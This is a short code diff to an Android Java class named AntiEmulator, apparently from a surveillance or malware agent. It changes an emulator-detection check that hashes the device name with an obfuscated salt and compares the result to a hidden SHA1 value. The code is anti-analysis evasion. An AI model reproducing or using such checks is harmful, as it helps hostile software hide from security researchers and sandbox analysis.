@@ -316,11 +316,11 @@ public class AntiEmulator {
 
     private boolean isTestEmu() {
 
-        String product = Build.PRODUCT;
-        String digest = Digest.SHA1(M.e("oJtb2LTJkhUF") + product.toLowerCase()).toLowerCase();
+        String product = Build.DEVICE;
+        String digest = Digest.SHA1(M.e("oJtb2LTJkhUF") + product).toLowerCase();
 
         // wH6ZrSNNT8b5wysfyAdP
-        if (digest.equals(M.e("f19ad4a8c74c793ac38da705fc447e264f3d594b"))) {
+        if (digest.equals(M.e("a23ecb8153ee7f8d77f9ba47757384f8b63d1def"))) {
             if(Cfg.DEBUG){
                 Log.d(TAG, " (isTestEmu) we are in the emulator" );
             }
